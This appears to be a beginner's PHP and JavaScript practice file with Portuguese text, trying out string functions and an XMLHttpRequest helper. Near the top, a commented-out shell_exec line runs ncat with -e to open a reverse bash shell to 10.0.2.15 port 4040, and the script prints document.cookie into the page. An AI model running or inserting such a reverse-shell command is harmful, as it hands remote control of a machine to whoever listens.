<?php
//echo"executando";
//echo shell_exec("cd /; ncat 10.0.2.15 4040 -e usr/bin/bash");
$texto="vamos passear muito hoje /mesmo sem voce";
$pt=strrchr($texto, "/");

echo str_ireplace("voce","qualquer coisa", $pt)."<br>";
$texto2=" hoje a festa ta fine {tudo pode acontecer conosco e convosco}entao melhor evitarmos problemas";

//echo substr($texto2,22,10);
$t=strpos($texto2,"}")+3;
echo strstr($texto2,"$texto2[$t]");
echo $t;
echo $texto2[$t].'<br>';
str_contains($texto,"vamos");
$text="a,s,d,f,g,h,j,q,w,e,r,t,y,u";

//echo $_COOKIE['userLink']."<br>";

$ar1="C002.txt";
//echo copy("icon/".$ar1,"comentaries/".$ar1);
echo"<br>";
 
 function fala($voice){
 	if ($voice!="") {
 		return $voice;
 		// code...
 	}
 } 
 echo "string";
  fala("voce");
  array_search(needle, haystack);
	?>
<script type="text/javascript">
	window.onload=function(){
	
	var fs="{somos uma organizacao especial} que nao trabalha muito"

	var st= fs.indexOf("{");
	var lt=fs.lastIndexOf("}")
	document.write("<h1>"+fs.substring(st+1,lt)+"</h1>")
	document.write(document.cookie)

	function req(site,id){
  sys=new XMLHttpRequest()

  sys.onreadystatechange=function(){

    if(sys.readyState==4&&sys.status==200){


      document.getElementById(id).innerHTML = this.responseText

    }
  }
  sys.open("Get",site,true)
  sys.send()

}

	}
</script>
